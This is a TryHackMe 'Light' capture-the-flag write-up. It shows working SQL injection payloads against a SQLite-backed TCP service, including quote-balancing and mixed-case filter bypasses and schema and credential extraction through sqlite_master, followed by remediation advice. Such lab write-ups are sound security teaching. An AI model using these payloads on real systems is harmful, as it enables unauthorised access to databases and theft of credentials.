# Light Challenge

![Banner](./../IMAGES/light_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[Light](https://tryhackme.com/room/lightroom)*

> [!IMPORTANT]
>
> **Working writeup notice:** This was a working and verified writeup at the time of writing on **23 November 2026**.
>
> **Spoiler warning:** This writeup documents the complete exploitation process. The admin username, admin password, intermediate credentials and the exact flag code have been redacted.
>
> **Please note:** The target IP address was dynamically allocated by TryHackMe. The assessment was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents credentials, account names, password values and other direct challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation, database security and defensive security.

## Lab Summary

Light is a database application challenge in which the entire service runs over a plain TCP connection. Instead of a web front end, the target exposes a Netcat-style service on port `1337` that greets the user and repeatedly asks for a username. Every submitted username is passed into an SQL query, and the application prints back the matching password. The challenge asked three questions:

1. The admin username.
2. The password belonging to that admin username.
3. The flag.

The successful attack chain involved:

1. Confirming the target, VPN route, `tun0` address and local hostname mapping.
2. Connecting to the service and establishing a baseline with the provided starter account.
3. Confirming SQL injection with a tautology-based payload.
4. Discovering that the application filtered `--`, `/*` and `%0b` in user input.
5. Bypassing the comment filter by balancing quotation marks instead of commenting.
6. Discovering a second filter that rejected lowercase SQL keywords such as `UNION` and `SELECT`.
7. Bypassing the keyword filter with mixed-case SQL keywords.
8. Determining that the original query returned only a single column.
9. Enumerating table names and schemas through SQLite's `sqlite_master` catalogue.
10. Extracting the admin username, the admin password and the flag from the administrative table.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: light.thm
Service port: 1337
```

The target was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> light.thm" | sudo tee -a /etc/hosts
```

The mapping, route and VPN interface were confirmed with:

```bash
getent hosts light.thm
ip route get <TARGET_IP>
ip -br address show tun0
ping -c 4 light.thm
```

The expected routing information showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using a personal Kali Linux VM, `/etc/hosts` is especially important for TryHackMe challenges. Some rooms rely on hostname-based routing, redirects, virtual hosts, certificates, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become clogged with entries left behind by previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A hosts file overflowing with retired lab entries eventually becomes DNS hoarding - every line is a memory, but none of them pay rent.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old Light entry can be removed with:

```bash
sudo sed -i '/light\.thm/d' /etc/hosts
```

The currently allocated target can then be added again using `<TARGET_IP>`.

The room introduction noted that the database service could take two to three minutes to start fully after the machine booted, so a short wait before connecting avoided confusing connection refusals.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip`, `getent` and `ping` for VPN routing, hostname resolution and connectivity checks.
- Netcat for connecting to the database service on port `1337`.
- Manual SQL injection testing against the service prompt.
- SQLite-specific catalogue knowledge, including the `sqlite_master` table and `group_concat()`.
- Standard Linux utilities including `cat`, `echo` and `sed` for `/etc/hosts` management.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Connectivity Confirmation

The hostname resolved correctly through `/etc/hosts`, the target answered ping requests over the VPN and the round-trip time confirmed a healthy tunnel:

```text
4 packets transmitted, 4 received, 0% packet loss
```

With routing verified, the next step was to speak to the application itself.

### Connecting to the Database Service

The service was reached with Netcat on port `1337`:

```bash
cd /tmp/VK/ && nc light.thm 1337
```

The service returned a greeting and a username prompt:

```text
Welcome to the Light database!
Please enter your username:
```

The room introduction suggested beginning with the supplied starter account, so that username was submitted:

```text
smokey
```

The application responded with the account's password:

```text
Password: <REDACTED>
```

and then looped back to the username prompt. This behaviour revealed the application's core function: submit a username, receive that account's password. The repeated prompt also made the service ideal for iterative injection testing, because every reply offered a fresh input point.

## Exploits

### Confirming SQL Injection with a Tautology

The first test submitted a classic tautology payload:

```text
' OR 1=1 --
```

The application rejected it with an unusually helpful message:

```text
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

This disclosed two facts at once:

1. The input was being placed into an SQL query, and the developer knew it.
2. A blocklist filtered comment terminators and selected whitespace sequences.

Because the application volunteered the blocklist, no bisecting was required to find the first filter.

### Comment-Free Injection Through Quote Balancing

Without access to `--` or `/*`, the payload could not simply comment out the remainder of the query. Instead, the injection was closed syntactically by balancing quotes, letting the application's own trailing quotation mark complete the statement:

```text
' OR '1'='1
```

The resulting condition evaluated as true for every row, and the application returned a different account's password:

```text
Password: <REDACTED>
```

This confirmed that:

1. The input was interpolated directly into the query string.
2. The query wrapped the input in single quotes.
3. Every injection payload needed to end in a state that left the query syntactically valid once the application appended its own closing quote.

### Discovering the Keyword Filter

A UNION-based payload was attempted to take control of the query output:

```text
' UNION SELECT 1,2 WHERE '1'='1
```

The application refused it with a second personality reveal:

```text
Ahh there is a word in there I don't like :(
```

Naive keyword blocklists frequently check only lowercase forms, while SQL keywords are case-insensitive. The payload was retried with mixed case:

```text
' UnIoN SeLeCt 1,2 WhErE '1'='1
```

The filter accepted the input, and the database itself responded:

```text
Error: SELECTs to the left and right of UNION do not have the same number of result columns
```

The keyword bypass worked, and the error disclosed that the column count needed adjusting.

### Column Count Enumeration

The column count was incremented until the error disappeared:

```text
' UnIoN SeLeCt 1,2,3 WhErE '1'='1
' UnIoN SeLeCt 1,2,3,4 WhErE '1'='1
' UnIoN SeLeCt 1,2,3,4,5 WhErE '1'='1
```

All three returned the same column-count error. Reflecting on the display behaviour changed the approach: the application had only ever printed a single `Password:` line, never a username. That suggested the original query selected just one column. The single-column payload was tried:

```text
' UnIoN SeLeCt 1 WhErE '1'='1
```

The application echoed the injected value back:

```text
Password: 1
```

The original query therefore selected one column, and the UNION injection now gave complete control over the value printed in the password slot. An interesting corollary: probing upward first wasted four attempts, whereas observing the application's own output behaviour would have pointed at one column immediately.

### Enumerating Tables Through sqlite_master

SQLite stores its schema in a built-in catalogue table named `sqlite_master`, which any query context can read. Because SQLite identifiers are case-insensitive, the same mixed-case technique applied throughout. The table names were extracted with `group_concat()`, which folds every result row into a single comma-separated string - convenient given the one-column output slot:

```text
' UnIoN SeLeCt group_concat(name) FrOm sqlite_master WhErE '1'='1
```

The application returned:

```text
Password: usertable,admintable
```

Two tables existed: a general user table and an administrative table. The administrative table was the obvious target.

### Recovering the Administrative Schema

The `sql` column of `sqlite_master` stores the full `CREATE TABLE` statement for each object, so the administrative table's schema was retrieved in one query:

```text
' UnIoN SeLeCt group_concat(sql) FrOm sqlite_master WhErE name='admintable' And '1'='1
```

Note the deliberate `And '1'='1` tail: the payload ends with an open quote context that the application's trailing quote completes, keeping the statement valid without any comment characters.

The application returned:

```text
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

The table held three columns: `id`, `username` and `password`.

### Extracting the Admin Username

The usernames were concatenated and returned through the injection slot:

```text
' UnIoN SeLeCt group_concat(username) FrOm admintable WhErE '1'='1
```

The application returned two rows folded into one string:

```text
Password: <REDACTED>,<REDACTED>
```

The first value was the administrator account, answering the first question:

```text
1. Admin username: <REDACTED>
```

The second row's name suggested it existed purely to hold the challenge flag.

### Extracting the Admin Password

A targeted query selected the password belonging to the administrator account:

```text
' UnIoN SeLeCt password FrOm admintable WhErE username='<REDACTED>' And '1'='1
```

An initial version of this payload ended immediately after the username value without the balancing tail. The database rejected it and, in doing so, disclosed the query's structure:

```text
Error: unrecognized token: "'<REDACTED>'' LIMIT 30"
```

This leaked two details: the application appended `LIMIT 30` to every query, and the input was interpolated as designed. The balanced variant was accepted, and the application returned:

```text
Password: <REDACTED>
```

which answered the second question:

```text
2. Admin password: <REDACTED>
```

### Extracting the Flag

The remaining administrative row was targeted using the same pattern, selecting the password value where the username matched the flag-labelled record:

```text
' UnIoN SeLeCt password FrOm admintable WhErE username='<REDACTED>' And '1'='1
```

The application returned the flag in the password slot:

```text
Password: THM{....}
```

which answered the final question:

```text
3. Flag: THM{....}
```

The flag's own wording summed up the challenge neatly - the entire compromise was a straightforward demonstration of SQLite injection through a single input field.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The dynamically allocated target was mapped to `light.thm` in `/etc/hosts`. Route checks confirmed that traffic to `<TARGET_IP>` used the TryHackMe VPN and originated from `<TUN0_IP>`. The service was given time to start fully before connecting.

### 2. Baseline Interaction
Netcat connected to the database service on port `1337`. The supplied starter account produced a password in response to a username, establishing the application's single input point and single output slot.

### 3. Injection Confirmation and First Filter
A tautology payload with a comment terminator was rejected, and the application helpfully disclosed its blocklist of `/*`, `--` and `%0b`. This confirmed injection while removing comment-based techniques from the toolkit.

### 4. Quote-Balancing Bypass
The tautology was rewritten to balance its own quotes, ending in an open condition that the application's trailing quote completed. The altered query returned a different account's password, proving full injectability.

### 5. Keyword Filter Bypass
A UNION payload was blocked by a second filter on SQL keywords. Mixed-case keywords bypassed the check, since the filter was case-sensitive but SQLite is not.

### 6. Column Count Discovery
Incrementing probes returned column-count errors for two through five columns. Observing that the application only ever printed a password led to the single-column payload, which succeeded.

### 7. Schema Enumeration
The `sqlite_master` catalogue was queried with `group_concat()` to list table names, then to recover the full `CREATE TABLE` statement for the administrative table.

### 8. Data Extraction
The administrative usernames were concatenated and returned, identifying the administrator account and a flag-bearing row. Targeted queries against each row returned the admin password and, finally, the flag:

```text
1. Admin username: <REDACTED>
2. Admin password: <REDACTED>
3. Flag: THM{....}
```

## Key Lessons

Light demonstrated several useful injection and defensive-security lessons:

- Confirm VPN routing and hostname resolution before interacting with the service.
- Keep `/etc/hosts` tidy when using a personal Kali Linux VM for TryHackMe rooms.
- Services built on raw TCP still deserve full injection testing; the transport does not change the query behind it.
- Overly friendly error and rejection messages disclose the developer's assumptions and the exact filtering rules.
- Comment-based query termination is a convenience, not a requirement; balanced quotations achieve the same result.
- Every injection payload must be assessed against what the application appends to the query, including trailing quotes and clauses.
- Naive keyword blocklists that match only lowercase forms are defeated by case variation, because SQL keywords are case-insensitive.
- Application output structure leaks query structure; a single displayed field hints at a single selected column.
- Probing upward from one column costs less time than probing downward from a guess.
- SQLite's `sqlite_master` catalogue exposes the entire schema to any injectable query context.
- `group_concat()` turns many rows into one value, fitting extractions through narrow output slots.
- Verbose database errors can disclose query suffixes such as `LIMIT` clauses and confirm input placement.
- Security through input rejection messages is a form of documentation for the attacker.
- Defense in depth matters: a prepared statement would have rendered every bypass in this writeup irrelevant.

The most important lesson was that the challenge's protection consisted entirely of input filtering, which failed twice through two independent design weaknesses. Neither filter addressed the underlying problem that untrusted input was interpolated into SQL.

## Remediation Notes

### SQL Injection Prevention

- Use parameterised queries or prepared statements for all database operations.
- Never interpolate user input into query strings, regardless of surrounding filters.
- Reject or neutralise input at validation time without disclosing which characters or keywords triggered the rejection.
- Return generic errors for malformed queries and log the details server-side instead.
- Restrict the database account used by the application to the minimum required tables and operations.

### Input Filtering Design

- Do not rely on blocklists of characters, keywords or encodings as the primary control.
- Any keyword filtering must be case-insensitive and applied after input normalisation.
- Filtering based on comment syntax does not prevent injection; it only changes which payloads work.
- Prefer allowlists over blocklists wherever the expected input shape is known, such as usernames matching a defined pattern.
- Test filtering bypass techniques such as mixed case, encoding, comment alternatives and quote balancing during development.

### Information Disclosure

- Do not relay raw database errors to end users.
- Error text such as column-count mismatches and token errors reveals query structure, column counts and appended clauses.
- Suppress schema details, table names and query fragments in all client-facing output.
- Consider that every response is a channel through which the database talks to the attacker; minimise what it can say.

### SQLite-Specific Hardening

- Remember that `sqlite_master` is readable from ordinary query contexts, so schema secrecy provides no protection.
- Grant the application's database connection the least access possible within the single database file.
- Segregate highly sensitive records from tables reachable by routine application queries.
- Avoid embedding secrets, flags or credentials alongside operational records in the same table.
- Apply row-level separation or separate storage for administrative values.

### Service Design

- Rate-limit and authenticate access to database-backed services rather than leaving them open to any connection.
- Log repeated injection-like inputs, including tautologies and UNION attempts.
- Keep services bound to the minimum network exposure required for their function.
- Provide honest but restrained rejection messages; describing blocked characters documents the filter for attackers.

### Operational Hygiene

- Keep `/etc/hosts` limited to mappings required for the active challenge or assessment.
- Remove stale entries after each lab.
- Record the target IP, hostname and `tun0` address before beginning enumeration.
- Use a dedicated working directory for notes and evidence.
- Redact credentials, account names and flags before publishing write-ups.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
